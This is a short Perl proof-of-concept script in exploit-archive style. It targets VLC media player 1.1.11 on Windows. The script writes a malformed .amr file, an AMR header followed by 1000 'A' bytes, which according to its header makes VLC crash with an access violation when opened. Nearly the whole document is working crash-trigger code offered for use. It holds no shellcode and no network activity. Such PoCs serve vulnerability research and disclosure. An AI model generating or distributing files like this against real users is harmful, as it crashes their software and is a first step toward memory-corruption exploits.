#!/usr/bin/perl
##
# Exploit Title: VLC media player v1.1.11 (.amr) Local Crash PoC
# Date: 04.01.2012
# Author: Fabi@habsec (hapsec@gmail.com)
# Software Link: http://sourceforge.net/projects/vlc/files/1.1.11/win32/vlc-1.1.11-win32.exe
# Version: 1.1.11
# Tested on: Windows 7 x86 English
#
# Description: Unhandled Access Violation Exception loading generated .amr file
#              - 1.1.10 not affected!
#
##
#
#
#
system("title VLC .amr crash PoC");
system("cls");
print "\n";                  
print " [*] Name : VLC media player v1.1.11 (Adaptive Multi-Rate)\n";
print " [*] Exploit : Local Crash PoC                            \n";
sleep(2);
print "\n";
my $amr_boof = "\x23\x21\x41\x4D\x52"; # Treat as AMR 
$amr_boof .= "\x41"x1000; # j4f
open(file , ">", "b00f.amr");
print file $amr_boof;
print "  [+] File successfully created! Open in VLC or drag to playlist..\n" or die print "\n Wuups- Could not create File.. ";
close(file);
# 
#Hannibal ante portas